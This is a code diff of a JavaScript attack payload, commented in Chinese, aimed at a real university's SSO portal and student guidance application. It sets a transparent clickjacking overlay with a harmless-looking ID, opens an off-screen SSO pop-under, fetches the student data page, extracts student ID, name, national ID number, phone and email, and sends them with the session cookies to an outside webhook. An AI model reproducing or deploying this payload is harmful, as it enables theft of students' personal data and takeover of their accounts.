@@ -1,63 +1,135 @@
 (async () => {
-    // === 設定區域 ===
-    // 你的 Webhook 接收地址
+    // === 設定 ===
     const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
-    
-    // SSO 入口 (位於 iportal2，用於觸發登入)
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
+    // 假設這是相對於 iframe 當前域名的路徑
+    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
+
+    // === 工具函數 ===
     
-    // 攻擊目標 (位於 ap.itc，登入後才有權限訪問)
-    // 建議先試試看這個登入檢查點，或者你可以換成首頁 "/GuidanceApp/index.do"
-    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 
-    // const targetUrl = "/GuidanceApp/student/studentInfo.do"; // 備用目標
+    // 1. CORS 繞過日誌記錄器 (射後不理)
+    // 使用 Image 物件發送 GET 請求，不會觸發 CORS 阻擋
+    const log = (msg) => {
+        try {
+            new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`;
+        } catch(e) {}
+    };
 
-    // === 攻擊邏輯 ===
-    try {
-        // 1. 創建隱藏的子 Iframe (Level 3)
-        // 這會利用瀏覽器自動攜帶 iportal2 Cookie 的特性，完成 SSO 流程
-        // 並將新的 ap.itc Session Cookie 寫入瀏覽器
-        const ifr = document.createElement('iframe');
-        ifr.style.display = 'none';
-        ifr.src = ssoUrl;
-        document.body.appendChild(ifr);
+    // 2. 數據外傳器
+    // 使用 no-cors 模式的 fetch 發送 JSON 數據
+    const exfiltrate = (data) => {
+        try {
+            const payload = JSON.stringify(data);
+            // 優先使用 navigator.sendBeacon (更可靠)
+            if (navigator.sendBeacon) {
+                const blob = new Blob([payload], {type: 'text/plain'});
+                navigator.sendBeacon(webhook, blob);
+            } else {
+                // 回退方案
+                fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors', // 關鍵：忽略跨域回應
+                    headers: {'Content-Type': 'text/plain'}, // 避免觸發 Preflight
+                    body: payload
+                });
+            }
+            log("Exfiltration_Sent");
+        } catch (e) {
+            log("Exfil_Error_" + e.message);
+        }
+    };
 
-        // 回報狀態：開始攻擊
-        fetch(webhook + "?step=1_triggering_sso");
+    // === 攻擊流程 ===
 
-        // 2. 等待 SSO 流程完成
-        // 這需要一點時間讓子 iframe 載入、執行 JS、POST、重導向
-        // 設定 5 秒應該足夠，如果網路慢可以設久一點
-        await new Promise(resolve => setTimeout(resolve, 10000));
+    async function executeAttack() {
+        log("Script_Started");
 
-        // 3. 嘗試讀取目標資料 (Level 2 - 自身環境)
-        // 此時 Session 應該已經建立，且因為我們在 ap.itc 同源環境，可以直接 fetch
-        const response = await fetch(targetUrl);
-        const content = await response.text();
+        // 步驟 1: 建立隱形覆蓋層 (點擊劫持)
+        const overlay = document.createElement('div');
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0); 
+            z-index: 2147483647; /* 最大整數值 */
+            cursor: default;
+        `;
+        overlay.id = 'security_check_overlay'; // 取個無害的 ID
+        document.body.appendChild(overlay);
+        
+        log("Overlay_Deployed_Waiting_For_Click");
 
-        // 4. 回傳戰果
-        const loot = {
-            msg: "Attack Completed",
-            current_origin: window.location.origin,
-            target_url: targetUrl,
-            status_code: response.status,
-            // 抓取部分內容預覽 (避免過長)
-            html_preview: content.substring(0, 12000),
-            // 所有的 Cookie (包含剛剛 SSO 拿到的新 Session)
-            cookies: document.cookie
+        // 步驟 2: 定義觸發器 (一次性事件)
+        const clickHandler = async (event) => {
+            // 立即移除覆蓋層，讓使用者之後能正常操作
+            overlay.remove();
+            
+            log("User_Clicked_Initiating_Auth");
+
+            // 步驟 3: 觸發 SSO 彈窗 (Pop-under)
+            // 嘗試將視窗開在螢幕外
+            const popup = window.open(ssoUrl, "sso_auth_window", "width=100,height=100,left=-1000,top=-1000");
+            
+            if (popup) {
+                // 嘗試讓彈窗失焦，主視窗聚焦
+                try { popup.blur(); window.focus(); } catch(e) {}
+                
+                // 等待 5 秒讓 SSO 重定向流程跑完
+                await new Promise(r => setTimeout(r, 5000));
+                
+                // 關閉彈窗
+                try { popup.close(); } catch(e) {}
+                log("Popup_Closed_Fetching_Data");
+
+                // 步驟 4: 獲取受害者數據
+                try {
+                    const response = await fetch(targetUrl);
+                    const text = await response.text();
+
+                    // 步驟 5: 解析數據
+                    let info = {};
+                    try {
+                        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
+                        // 使用正則抓取標籤後的內容
+                        info.studentId = clean(text.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.name = clean(text.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.idCard = clean(text.match(/身分證字號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.phone = clean(text.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                        info.email = clean(text.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
+                    } catch (parseErr) {
+                        log("Parse_Error");
+                    }
+
+                    // 步驟 6: 回傳數據
+                    exfiltrate({
+                        status: "SUCCESS",
+                        data: info,
+                        cookie: document.cookie,
+                        // 可選：回傳部分 HTML 以供調試 (前 1000 字)
+                        partial_source: text.substring(0, 1000) 
+                    });
+
+                } catch (fetchErr) {
+                    log("Fetch_Error_" + fetchErr.message);
+                }
+
+            } else {
+                log("Popup_Blocked");
+            }
         };
 
-        await fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(loot)
-        });
-
-        // 5. (可選) 清理現場
-        // document.body.removeChild(ifr); 
-        // 建議不要太快移除，以免流程還沒跑完，或者為了保持 Session 活躍
-
-    } catch (e) {
-        // 錯誤處理
-        fetch(webhook + "?error=" + encodeURIComponent(e.message));
+        // 將監聽器綁定到覆蓋層
+        overlay.addEventListener('click', clickHandler, { once: true });
     }
+
+    // 執行
+    try {
+        executeAttack();
+    } catch(e) {
+        // 最後一道防線的錯誤回報
+        new Image().src = webhook + "?fatal_error=" + encodeURIComponent(e.message);
+    }
+
 })();
